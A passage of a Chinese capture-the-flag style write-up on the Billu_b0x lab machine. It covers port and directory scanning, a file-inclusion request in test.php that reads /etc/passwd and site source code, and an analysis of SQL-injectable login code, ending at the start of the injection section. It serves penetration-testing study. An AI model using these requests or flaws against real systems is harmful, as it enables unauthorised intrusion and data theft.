itemprop="dateCreated datePublished" datetime="2026-05-20T16:00:00.000Z" title="发表于 2026-05-21 00:00:00">2026-05-21</time><time itemprop="dateCreated datePublished" datetime="2026-05-21T13:19:03.869Z" title="更新于 2026-05-21 21:19:03">2026-05-21</time></header><h1 id="Billu-b0x-靶场学习记录"><a href="#Billu-b0x-靶场学习记录" class="headerlink" title="Billu_b0x 靶场学习记录"></a>Billu_b0x 靶场学习记录</h1><h2 id="环境信息"><a href="#环境信息" class="headerlink" title="环境信息"></a>环境信息</h2><table>
+<thead>
+<tr>
+<th>项目</th>
+<th>值</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>攻击机</td>
+<td>Kali Linux (192.168.137.148)</td>
+</tr>
+<tr>
+<td>靶机 IP</td>
+<td>192.168.137.153</td>
+</tr>
+<tr>
+<td>靶机开放端口</td>
+<td>22 (SSH), 80 (HTTP)</td>
+</tr>
+<tr>
+<td>靶机系统</td>
+<td>Ubuntu 12.04.5 LTS</td>
+</tr>
+<tr>
+<td>内核版本</td>
+<td>Linux 3.13.0-32-generic (i686)</td>
+</tr>
+<tr>
+<td>Web 服务</td>
+<td>Apache 2.2.22</td>
+</tr>
+<tr>
+<td>SSH 服务</td>
+<td>OpenSSH 5.9p1</td>
+</tr>
+</tbody></table>
+<hr>
+<h2 id="一、信息收集"><a href="#一、信息收集" class="headerlink" title="一、信息收集"></a>一、信息收集</h2><h3 id="1-1-主机发现"><a href="#1-1-主机发现" class="headerlink" title="1.1 主机发现"></a>1.1 主机发现</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">arp-scan -l</span><br></pre></td></tr></table></figure>
+
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/cover/404.png&quot;" data-lazy-src="image-20260521152757043.png" alt="image-20260521152757043"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Interface: eth0, type: EN10MB, MAC: 00:0c:29:59:de:ab, IPv4: 192.168.137.148</span><br><span class="line">Starting arp-scan 1.10.0 with 256 hosts (https://github.com/royhills/arp-scan)</span><br><span class="line">192.168.137.1   00:50:56:c0:00:08       (Unknown)</span><br><span class="line">192.168.137.2   00:50:56:e3:1e:64       (Unknown)</span><br><span class="line">192.168.137.153 00:0c:29:9d:fd:f9       (Unknown)</span><br><span class="line">192.168.137.254 00:50:56:e2:ca:7f       (Unknown)</span><br></pre></td></tr></table></figure>
+
+<p>确定靶机为 <code>192.168.137.153</code>。</p>
+<h3 id="1-2-全端口扫描"><a href="#1-2-全端口扫描" class="headerlink" title="1.2 全端口扫描"></a>1.2 全端口扫描</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap --min-rate=10000 -p- 192.168.137.153</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">Starting Nmap 7.99 ( https://nmap.org ) at 2026-05-21 03:29 -0400</span><br><span class="line">Nmap scan report for 192.168.137.153</span><br><span class="line">Host is up (0.054s latency).</span><br><span class="line">Not shown: 65533 closed tcp ports (reset)</span><br><span class="line">PORT   STATE SERVICE</span><br><span class="line">22/tcp open  ssh</span><br><span class="line">80/tcp open  http</span><br><span class="line">MAC Address: 00:0C:29:9D:FD:F9 (VMware)</span><br><span class="line"></span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 9.92 seconds</span><br></pre></td></tr></table></figure>
+
+<p>仅开放 22 (SSH) 和 80 (HTTP)，攻击面集中在 Web 应用。</p>
+<h3 id="1-3-服务版本扫描"><a href="#1-3-服务版本扫描" class="headerlink" title="1.3 服务版本扫描"></a>1.3 服务版本扫描</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -T4 -sV -sT -sC -O -p80,22 192.168.137.153</span><br></pre></td></tr></table></figure>
+
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/cover/404.png&quot;" data-lazy-src="image-20260521153106992.png" alt="image-20260521153106992"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">Starting Nmap 7.99 ( https://nmap.org ) at 2026-05-21 03:30 -0400</span><br><span class="line">Nmap scan report for 192.168.137.153</span><br><span class="line">Host is up (0.0011s latency).</span><br><span class="line"></span><br><span class="line">PORT   STATE SERVICE VERSION</span><br><span class="line">22/tcp open  ssh     OpenSSH 5.9p1 Debian 5ubuntu1.4 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">| ssh-hostkey: </span><br><span class="line">|   1024 fa:cf:a2:52:c4:fa:f5:75:a7:e2:bd:60:83:3e:7b:de (DSA)</span><br><span class="line">|   2048 88:31:0c:78:98:80:ef:33:fa:26:22:ed:d0:9b:ba:f8 (RSA)</span><br><span class="line">|_  256 0e:5e:33:03:50:c9:1e:b3:e7:51:39:a4:4a:10:64:ca (ECDSA)</span><br><span class="line">80/tcp open  http    Apache httpd 2.2.22 ((Ubuntu))</span><br><span class="line">|_http-title: --==[[IndiShell Lab]]==--</span><br><span class="line">|_http-server-header: Apache/2.2.22 (Ubuntu)</span><br><span class="line">| http-cookie-flags: </span><br><span class="line">|   /: </span><br><span class="line">|     PHPSESSID: </span><br><span class="line">|_      httponly flag not set</span><br><span class="line">MAC Address: 00:0C:29:9D:FD:F9 (VMware)</span><br><span class="line">Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port</span><br><span class="line">Device type: general purpose</span><br><span class="line">Running: Linux 3.X|4.X</span><br><span class="line">OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4</span><br><span class="line">OS details: Linux 3.2 - 4.14, Linux 3.8 - 3.16</span><br><span class="line">Network Distance: 1 hop</span><br><span class="line">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</span><br><span class="line"></span><br><span class="line">OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 11.22 seconds</span><br></pre></td></tr></table></figure>
+
+<table>
+<thead>
+<tr>
+<th>信息项</th>
+<th>结果</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>操作系统</td>
+<td>Ubuntu (Linux 3.2 - 4.14)</td>
+</tr>
+<tr>
+<td>Web 服务器</td>
+<td>Apache 2.2.22</td>
+</tr>
+<tr>
+<td>SSH 版本</td>
+<td>OpenSSH 5.9p1</td>
+</tr>
+<tr>
+<td>页面标题</td>
+<td>IndiShell Lab</td>
+</tr>
+</tbody></table>
+<h3 id="1-4-漏洞扫描"><a href="#1-4-漏洞扫描" class="headerlink" title="1.4 漏洞扫描"></a>1.4 漏洞扫描</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap --script=vuln -p22,80 192.168.137.153</span><br></pre></td></tr></table></figure>
+
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/cover/404.png&quot;" data-lazy-src="image-20260521153516536.png" alt="image-20260521153516536"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">Starting Nmap 7.99 ( https://nmap.org ) at 2026-05-21 03:32 -0400</span><br><span class="line">Nmap scan report for 192.168.137.153</span><br><span class="line">Host is up (0.00068s latency).</span><br><span class="line"></span><br><span class="line">PORT   STATE SERVICE</span><br><span class="line">22/tcp open  ssh</span><br><span class="line">80/tcp open  http</span><br><span class="line">| http-cookie-flags: </span><br><span class="line">|   /: </span><br><span class="line">|     PHPSESSID: </span><br><span class="line">|_      httponly flag not set</span><br><span class="line">|_http-dombased-xss: Couldn&#x27;t find any DOM based XSS.</span><br><span class="line">| http-internal-ip-disclosure: </span><br><span class="line">|_  Internal IP Leaked: 127.0.1.1</span><br><span class="line">|_http-stored-xss: Couldn&#x27;t find any stored XSS vulnerabilities.</span><br><span class="line">|_http-csrf: Couldn&#x27;t find any CSRF vulnerabilities.</span><br><span class="line">| http-enum: </span><br><span class="line">|   /test.php: Test page</span><br><span class="line">|_  /images/: Potentially interesting directory w/ listing on &#x27;apache/2.2.22 (ubuntu)&#x27;</span><br><span class="line">MAC Address: 00:0C:29:9D:FD:F9 (VMware)</span><br><span class="line"></span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 33.65 seconds</span><br></pre></td></tr></table></figure>
+
+<p>发现 <code>/test.php</code> 测试页面和 <code>/images/</code> 目录列表。</p>
+<h3 id="1-5-目录扫描"><a href="#1-5-目录扫描" class="headerlink" title="1.5 目录扫描"></a>1.5 目录扫描</h3><p><strong>dirsearch：</strong></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dirsearch -u http://192.168.137.153</span><br></pre></td></tr></table></figure>
+
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/cover/404.png&quot;" data-lazy-src="image-20260521160018545.png" alt="image-20260521160018545"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">Target: http://192.168.137.153/</span><br><span class="line"></span><br><span class="line">[03:56:08] Starting: </span><br><span class="line">[03:56:14] 200 -  307B  - /add</span><br><span class="line">[03:56:14] 200 -  307B  - /add.php</span><br><span class="line">[03:56:29] 200 -    1B  - /c</span><br><span class="line">[03:56:37] 200 -    3KB - /head</span><br><span class="line">[03:56:37] 200 -    3KB - /head.php</span><br><span class="line">[03:56:37] 301 -  251B  - /images  -&gt;  http://192.168.137.153/images/</span><br><span class="line">[03:56:37] 200 -  502B  - /images/</span><br><span class="line">[03:56:38] 200 -   47KB - /in</span><br><span class="line">[03:56:44] 302 -    2KB - /panel  -&gt;  index.php</span><br><span class="line">[03:56:45] 302 -    2KB - /panel.php  -&gt;  index.php</span><br><span class="line">[03:56:46] 200 -    8KB - /phpmy/</span><br><span class="line">[03:56:51] 200 -    1B  - /show</span><br><span class="line">[03:56:59] 200 -   72B  - /test</span><br><span class="line">[03:56:59] 200 -   72B  - /test.php</span><br><span class="line"></span><br><span class="line">Task Completed</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>多处路径的短文件名也可访问（如 <code>/add</code>、<code>/c</code>、<code>/in</code>），这是 Apache MultiViews 或 mod_negotiation 导致的。</p>
+</blockquote>
+<p><strong>dirb 大字典补充：</strong></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dirb http://192.168.137.153 /usr/share/dirb/wordlists/big.txt -r -X .txt,.php,.html</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">START_TIME: Thu May 21 04:00:59 2026</span><br><span class="line">URL_BASE: http://192.168.137.153/</span><br><span class="line">WORDLIST_FILES: /usr/share/dirb/wordlists/big.txt</span><br><span class="line"></span><br><span class="line">---- Scanning URL: http://192.168.137.153/ ----</span><br><span class="line">+ http://192.168.137.153/add.php (CODE:200|SIZE:307)</span><br><span class="line">+ http://192.168.137.153/c.php (CODE:200|SIZE:1)</span><br><span class="line">+ http://192.168.137.153/head.php (CODE:200|SIZE:2793)</span><br><span class="line">+ http://192.168.137.153/in.php (CODE:200|SIZE:47563)</span><br><span class="line">+ http://192.168.137.153/index.php (CODE:200|SIZE:3267)</span><br><span class="line">+ http://192.168.137.153/panel.php (CODE:302|SIZE:2469)</span><br><span class="line">+ http://192.168.137.153/show.php (CODE:200|SIZE:1)</span><br><span class="line">+ http://192.168.137.153/test.php (CODE:200|SIZE:72)</span><br></pre></td></tr></table></figure>
+
+<h3 id="1-6-目录速查汇总"><a href="#1-6-目录速查汇总" class="headerlink" title="1.6 目录速查汇总"></a>1.6 目录速查汇总</h3><table>
+<thead>
+<tr>
+<th>路径</th>
+<th>状态码</th>
+<th>说明</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>/index.php</code></td>
+<td>200</td>
+<td>首页&#x2F;登录框</td>
+</tr>
+<tr>
+<td><code>/panel.php</code></td>
+<td>302</td>
+<td>后台面板（需登录）</td>
+</tr>
+<tr>
+<td><code>/add.php</code></td>
+<td>200</td>
+<td>文件上传页面</td>
+</tr>
+<tr>
+<td><code>/test.php</code></td>
+<td>200</td>
+<td><strong>文件包含点</strong>，需 <code>file</code> 参数</td>
+</tr>
+<tr>
+<td><code>/in.php</code></td>
+<td>200</td>
+<td>phpinfo() 页面</td>
+</tr>
+<tr>
+<td><code>/phpmy/</code></td>
+<td>200</td>
+<td>phpMyAdmin</td>
+</tr>
+<tr>
+<td><code>/images/</code></td>
+<td>200</td>
+<td>目录列表可见</td>
+</tr>
+<tr>
+<td><code>/show.php</code></td>
+<td>200</td>
+<td>空白（可能是图片显示）</td>
+</tr>
+<tr>
+<td><code>/c.php</code></td>
+<td>200</td>
+<td>空白（数据库连接文件）</td>
+</tr>
+<tr>
+<td><code>/head.php</code></td>
+<td>200</td>
+<td>页面头部组件</td>
+</tr>
+</tbody></table>
+<h3 id="1-7-phpinfo-泄露"><a href="#1-7-phpinfo-泄露" class="headerlink" title="1.7 phpinfo 泄露"></a>1.7 phpinfo 泄露</h3><p>访问 <code>/in.php</code> 直接输出 phpinfo()，可获取网站绝对路径等敏感信息：</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/cover/404.png&quot;" data-lazy-src="image-20260521160630292.png" alt="image-20260521160630292"></p>
+<h3 id="1-8-阶段小结"><a href="#1-8-阶段小结" class="headerlink" title="1.8 阶段小结"></a>1.8 阶段小结</h3><p>信息收集阶段获得三项关键情报：</p>
+<ol>
+<li><strong>phpinfo 可访问</strong> — 泄露服务器配置和网站绝对路径</li>
+<li><strong><code>/images/</code> 目录列表</strong> — 文件上传后可能存放在此目录</li>
+<li><strong><code>test.php</code> 需要 <code>file</code> 参数</strong> — 疑似文件包含&#x2F;读取功能，是获取源码和 getshell 的关键入口</li>
+</ol>
+<hr>
+<h2 id="二、文件包含与源码审计"><a href="#二、文件包含与源码审计" class="headerlink" title="二、文件包含与源码审计"></a>二、文件包含与源码审计</h2><h3 id="2-1-test-php-—-文件包含漏洞"><a href="#2-1-test-php-—-文件包含漏洞" class="headerlink" title="2.1 test.php — 文件包含漏洞"></a>2.1 test.php — 文件包含漏洞</h3><p>直接访问 <code>/test.php</code> 返回空白，提示需要 <code>file</code> 参数：</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/cover/404.png&quot;" data-lazy-src="image-20260521160314807.png" alt="image-20260521160314807"></p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/cover/404.png&quot;" data-lazy-src="image-20260521160839105.png" alt="image-20260521160839105"></p>
+<p>抓包后将 GET 改为 POST，传入 <code>file=index.php</code>，成功获取 <code>index.php</code> 源码：</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/cover/404.png&quot;" data-lazy-src="image-20260521200615322.png" alt="image-20260521200615322"></p>
+<h3 id="2-2-index-php-源码审计（发现-SQL-注入）"><a href="#2-2-index-php-源码审计（发现-SQL-注入）" class="headerlink" title="2.2 index.php 源码审计（发现 SQL 注入）"></a>2.2 index.php 源码审计（发现 SQL 注入）</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">session_start</span>();</span><br><span class="line"></span><br><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;c.php&#x27;</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;head.php&#x27;</span>);</span><br><span class="line"><span class="keyword">if</span>(@<span class="variable">$_SESSION</span>[<span class="string">&#x27;logged&#x27;</span>]!=<span class="literal">true</span>)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="variable">$_SESSION</span>[<span class="string">&#x27;logged&#x27;</span>]=<span class="string">&#x27;&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;logged&#x27;</span>]==<span class="literal">true</span> &amp;&amp;  <span class="variable">$_SESSION</span>[<span class="string">&#x27;admin&#x27;</span>]!=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;you are logged in :)&quot;</span>;</span><br><span class="line">    <span class="title function_ invoke__">header</span>(<span class="string">&#x27;Location: panel.php&#x27;</span>, <span class="literal">true</span>, <span class="number">302</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;&lt;div align=center style=&quot;margin:30px 0px 0px 0px;&quot;&gt;</span></span><br><span class="line"><span class="string">    &lt;font size=8 face=&quot;comic sans ms&quot;&gt;--==[[ billu b0x ]]==--&lt;/font&gt; </span></span><br><span class="line"><span class="string">    &lt;br&gt;&lt;br&gt;</span></span><br><span class="line"><span class="string">    Show me your SQLI skills &lt;br&gt;</span></span><br><span class="line"><span class="string">    &lt;form method=post&gt;</span></span><br><span class="line"><span class="string">    Username :- &lt;Input type=text name=un&gt; &amp;nbsp Password:- &lt;input type=password name=ps&gt; &lt;br&gt;&lt;br&gt;</span></span><br><span class="line"><span class="string">    &lt;input type=submit name=login value=&quot;let\&#x27;s login&quot;&gt;&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;login&#x27;</span>]))</span><br><span class="line">&#123;</span><br><span class="line">    <span class="variable">$uname</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;\&#x27;&#x27;</span>,<span class="string">&#x27;&#x27;</span>,<span class="title function_ invoke__">urldecode</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;un&#x27;</span>]));</span><br><span class="line">    <span class="variable">$pass</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;\&#x27;&#x27;</span>,<span class="string">&#x27;&#x27;</span>,<span class="title function_ invoke__">urldecode</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;ps&#x27;</span>]));</span><br><span class="line">    <span class="variable">$run</span>=<span class="string">&#x27;select * from auth where  pass=\&#x27;&#x27;</span>.<span class="variable">$pass</span>.<span class="string">&#x27;\&#x27; and uname=\&#x27;&#x27;</span>.<span class="variable">$uname</span>.<span class="string">&#x27;\&#x27;&#x27;</span>;</span><br><span class="line">    <span class="variable">$result</span> = <span class="title function_ invoke__">mysqli_query</span>(<span class="variable">$conn</span>, <span class="variable">$run</span>);</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">mysqli_num_rows</span>(<span class="variable">$result</span>) &gt; <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="variable">$row</span> = <span class="title function_ invoke__">mysqli_fetch_assoc</span>(<span class="variable">$result</span>);</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;You are allowed&lt;br&gt;&quot;</span>;</span><br><span class="line">        <span class="variable">$_SESSION</span>[<span class="string">&#x27;logged&#x27;</span>]=<span class="literal">true</span>;</span><br><span class="line">        <span class="variable">$_SESSION</span>[<span class="string">&#x27;admin&#x27;</span>]=<span class="variable">$row</span>[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line">        <span class="title function_ invoke__">header</span>(<span class="string">&#x27;Location: panel.php&#x27;</span>, <span class="literal">true</span>, <span class="number">302</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;script&gt;alert(&#x27;Try again&#x27;);&lt;/script&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;font size=5 face=\&quot;comic sans ms\&quot; style=\&quot;left: 0;bottom: 0; position: absolute;margin: 0px 0px 5px;\&quot;&gt;B0X Powered By &lt;font color=#ff9933&gt;Pirates&lt;/font&gt; &quot;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p><strong>代码分析：</strong></p>
+<table>
+<thead>
+<tr>
+<th>关键点</th>
+<th>分析</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>过滤方式</td>
+<td><code>str_replace(&#39;\&#39;&#39;,&#39;&#39;, ...)</code> —— 移除所有单引号</td>
+</tr>
+<tr>
+<td>漏洞原因</td>
+<td>反斜杠 <code>\</code> <strong>未被过滤</strong>，可转义 SQL 语句中的闭合引号</td>
+</tr>
+<tr>
+<td>SQL 语句</td>
+<td><code>pass=&#39;$pass&#39; and uname=&#39;$uname&#39;</code></td>
+</tr>
+<tr>
+<td>登录后行为</td>
+<td><code>$_SESSION[&#39;admin&#39;] = $row[&#39;username&#39;]</code>，跳转至 panel.php</td>
+</tr>
+</tbody></table>
+<h3 id="2-3-add-php-源码审计（发现文件上传点）"><a href="#2-3-add-php-源码审计（发现文件上传点）" class="headerlink" title="2.3 add.php 源码审计（发现文件上传点）"></a>2.3 add.php 源码审计（发现文件上传点）</h3><p>通过 test.php 包含 <code>add.php</code> 得到源码：</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/cover/404.png&quot;" data-lazy-src="image-20260521201106781.png" alt="image-20260521201106781"></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;form  method=&quot;post&quot; enctype=&quot;multipart/form-data&quot;&gt;</span></span><br><span class="line"><span class="string">    Select image to upload:</span></span><br><span class="line"><span class="string">    &lt;input type=&quot;file&quot; name=image&gt;</span></span><br><span class="line"><span class="string">    &lt;input type=text name=name value=&quot;name&quot;&gt;</span></span><br><span class="line"><span class="string">    &lt;input type=text name=address value=&quot;address&quot;&gt;</span></span><br><span class="line"><span class="string">    &lt;input type=text name=id value=1337 &gt;</span></span><br><span class="line"><span class="string">    &lt;input type=&quot;submit&quot; value=&quot;upload&quot; name=&quot;upload&quot;&gt;</span></span><br><span class="line"><span class="string">&lt;/form&gt;&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>单独的 <code>add.php</code> 直接访问没有实际处理逻辑（上传没反应），因为真正的处理代码在 <code>panel.php</code> 内部通过 <code>?load=add</code> 加载并执行。</p>
+</blockquote>
+<h3 id="2-4-文件包含能力验证"><a href="#2-4-文件包含能力验证" class="headerlink" title="2.4 文件包含能力验证"></a>2.4 文件包含能力验证</h3><p>test.php 可以读取任意系统文件：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">POST /test.php</span><br><span class="line">file=/etc/passwd</span><br></pre></td></tr></table></figure>
+
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/cover/404.png&quot;" data-lazy-src="image-20260521200930884.png" alt="image-20260521200930884"></p>
+<p>成功读取 <code>/etc/passwd</code>，确认存在普通用户 <code>ica</code>（UID 1000）。尝试读取 <code>/etc/shadow</code> 则权限不足。</p>
+<h3 id="2-5-阶段小结"><a href="#2-5-阶段小结" class="headerlink" title="2.5 阶段小结"></a>2.5 阶段小结</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">test.php LFI 漏洞 → 读取 index.php 源码 → 发现 SQL 注入（单引号被过滤、反斜杠未过滤）</span><br><span class="line">                 → 读取 add.php 源码    → 发现文件上传功能</span><br><span class="line">                 → 读取 /etc/passwd     → 确认 LFI 可读系统文件</span><br></pre></td></tr></table></figure>
+
+<hr>
+<h2 id="三、SQL-注入（登录绕过）"><a href="#三、SQL-注入（登录绕过）" class="headerlink" title="三、SQL 注入（登录绕过）"></a>三、SQL 注入（登录绕过）</h2><h3 id="3-1-注入点分析"><a href="#3-1-注入点分析" class="headerlink" title="3.1 注入点分析"></a>3.1 注入点分析</h3><p>从 index.php 源码可知：</p>
